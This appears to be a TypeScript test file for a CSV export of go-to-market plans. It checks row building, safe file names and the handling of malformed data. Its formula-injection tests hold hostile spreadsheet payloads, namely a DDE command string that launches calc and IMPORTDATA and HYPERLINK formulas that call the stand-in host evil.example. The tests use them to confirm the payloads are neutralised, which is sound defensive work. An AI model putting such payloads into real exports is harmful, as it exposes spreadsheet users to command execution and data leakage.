import assert from "node:assert/strict";
import { test } from "node:test";
import { escapeCsvCell, serializeCsvRows } from "../src/lib/csv-export.ts";
import {
  buildGtmPlanInitiativeExportRows,
  buildGtmPlanKeyResultExportRows,
  buildGtmPlanObjectiveExportRows,
  buildGtmPlanOverviewExportRows,
  getGtmPlanExportBaseName,
} from "../src/lib/gtm-plan-export.ts";

const plan = {
  _id: "plan_123",
  name: "FY26 GTM Plan",
  fiscalYear: "2026",
  quarter: "Q1",
  status: "active",
  createdAt: 1_756_000_000_000,
  updatedAt: 1_756_086_400_000,
  objectives: [
    {
      id: "obj-1",
      title: "Grow pipeline",
      description: "Create enough qualified pipeline for the quarter",
      owner: "RevOps",
      status: "in_progress",
    },
  ],
  keyResults: [
    {
      id: "kr-1",
      objectiveId: "obj-1",
      title: "Reach 3x pipeline coverage",
      targetValue: 300,
      currentValue: 150,
      unit: "%",
    },
  ],
  initiatives: [
    {
      id: "init-1",
      objectiveId: "obj-1",
      title: "Launch enterprise campaign",
      description: "Focus on tier 1 target accounts",
      owner: "Marketing",
      startDate: "2026-01-01",
      endDate: "2026-03-31",
      status: "planned",
    },
  ],
};

test("buildGtmPlanOverviewExportRows includes org-scoped plan metadata and nested counts", () => {
  assert.deepEqual(buildGtmPlanOverviewExportRows([plan]), [
    {
      planId: "plan_123",
      planName: "FY26 GTM Plan",
      fiscalYear: "2026",
      quarter: "Q1",
      status: "active",
      objectiveCount: 1,
      keyResultCount: 1,
      initiativeCount: 1,
      createdAt: "2025-08-24T01:46:40.000Z",
      updatedAt: "2025-08-25T01:46:40.000Z",
    },
  ]);
});

test("section export rows preserve plan context and linked objective titles", () => {
  assert.deepEqual(buildGtmPlanObjectiveExportRows(plan), [
    {
      planId: "plan_123",
      planName: "FY26 GTM Plan",
      fiscalYear: "2026",
      quarter: "Q1",
      planStatus: "active",
      objectiveId: "obj-1",
      title: "Grow pipeline",
      description: "Create enough qualified pipeline for the quarter",
      owner: "RevOps",
      status: "in_progress",
      keyResultCount: 1,
    },
  ]);

  assert.deepEqual(buildGtmPlanKeyResultExportRows(plan), [
    {
      planId: "plan_123",
      planName: "FY26 GTM Plan",
      fiscalYear: "2026",
      quarter: "Q1",
      planStatus: "active",
      keyResultId: "kr-1",
      objectiveId: "obj-1",
      objectiveTitle: "Grow pipeline",
      title: "Reach 3x pipeline coverage",
      targetValue: 300,
      currentValue: 150,
      unit: "%",
      progressPercent: 50,
    },
  ]);

  assert.deepEqual(buildGtmPlanInitiativeExportRows(plan), [
    {
      planId: "plan_123",
      planName: "FY26 GTM Plan",
      fiscalYear: "2026",
      quarter: "Q1",
      planStatus: "active",
      initiativeId: "init-1",
      objectiveId: "obj-1",
      objectiveTitle: "Grow pipeline",
      title: "Launch enterprise campaign",
      description: "Focus on tier 1 target accounts",
      owner: "Marketing",
      startDate: "2026-01-01",
      endDate: "2026-03-31",
      status: "planned",
    },
  ]);
});

test("shared CSV export neutralizes spreadsheet formula injection", () => {
  assert.equal(escapeCsvCell("=cmd|' /C calc'!A0"), "'=cmd|' /C calc'!A0");
  assert.equal(escapeCsvCell("+SUM(1,2)"), "\"'+SUM(1,2)\"");
  assert.equal(escapeCsvCell("  @malicious"), "'  @malicious");
  assert.equal(escapeCsvCell("\t=malicious"), "'\t=malicious");
  assert.equal(escapeCsvCell("-12"), "-12");
  assert.equal(escapeCsvCell("+1 555 0100"), "+1 555 0100");
  assert.equal(escapeCsvCell(-10), "-10");
});

test("malicious GTM plan values are safe when serialized to CSV", () => {
  const maliciousPlan = {
    _id: "plan_malicious",
    name: "=IMPORTDATA(\"https://evil.example\")",
    fiscalYear: "2026",
    status: "active",
    objectives: [
      {
        id: "obj-malicious",
        title: "+SUM(1,2)",
        description: "  @hidden",
        owner: "-RevOps",
        status: "planned",
      },
    ],
    keyResults: [
      {
        id: "kr-malicious",
        objectiveId: "obj-malicious",
        title: "\t=cmd|' /C calc'!A0",
        targetValue: 100,
        currentValue: 25,
        unit: "=dollars",
      },
    ],
    initiatives: [
      {
        id: "init-malicious",
        objectiveId: "obj-malicious",
        title: "@HYPERLINK(\"https://evil.example\")",
        description: "safe text",
        owner: "Marketing",
        status: "planned",
      },
    ],
  };

  const overview = buildGtmPlanOverviewExportRows([maliciousPlan])[0];
  const objective = buildGtmPlanObjectiveExportRows(maliciousPlan)[0];
  const keyResult = buildGtmPlanKeyResultExportRows(maliciousPlan)[0];
  const initiative = buildGtmPlanInitiativeExportRows(maliciousPlan)[0];
  const csv = serializeCsvRows([
    Object.values(overview),
    Object.values(objective),
    Object.values(keyResult),
    Object.values(initiative),
  ]);

  assert.match(csv, /"'=IMPORTDATA\(""https:\/\/evil\.example""\)"/);
  assert.match(csv, /"'\+SUM\(1,2\)"/);
  assert.match(csv, /'  @hidden/);
  assert.match(csv, /'-RevOps/);
  assert.match(csv, /'\t=cmd\|' \/C calc'!A0/);
  assert.match(csv, /'=dollars/);
  assert.match(csv, /'@HYPERLINK/);
});

test("GTM plan export helpers tolerate malformed nested data and produce safe file names", () => {
  const malformedPlan = {
    _id: "plan_456",
    name: "Enterprise / Board Plan!",
    fiscalYear: "2026",
    status: "draft",
    objectives: [{ id: "obj-1", title: "Pipeline" }, null],
    keyResults: [{ id: "kr-1", objectiveId: "missing", targetValue: 0 }],
    initiatives: ["not an object"],
  };

  assert.equal(
    getGtmPlanExportBaseName(malformedPlan),
    "gtm-plan-2026-full-year-enterprise-board-plan",
  );
  assert.equal(
    getGtmPlanExportBaseName({
      ...malformedPlan,
      fiscalYear: "FY 2026/27",
      quarter: "Q1 & Q2",
      name: "Enterprise / Board Plan!",
    }),
    "gtm-plan-fy-2026-27-q1-q2-enterprise-board-plan",
  );
  assert.equal(buildGtmPlanOverviewExportRows([malformedPlan])[0].quarter, "Full Year");
  assert.deepEqual(buildGtmPlanKeyResultExportRows(malformedPlan)[0], {
    planId: "plan_456",
    planName: "Enterprise / Board Plan!",
    fiscalYear: "2026",
    quarter: "Full Year",
    planStatus: "draft",
    keyResultId: "kr-1",
    objectiveId: "missing",
    objectiveTitle: "",
    title: "",
    targetValue: 0,
    currentValue: "",
    unit: "",
    progressPercent: "",
  });
  assert.deepEqual(buildGtmPlanInitiativeExportRows(malformedPlan)[0], {
    planId: "plan_456",
    planName: "Enterprise / Board Plan!",
    fiscalYear: "2026",
    quarter: "Full Year",
    planStatus: "draft",
    initiativeId: "",
    objectiveId: "",
    objectiveTitle: "",
    title: "",
    description: "",
    owner: "",
    startDate: "",
    endDate: "",
    status: "",
  });
});
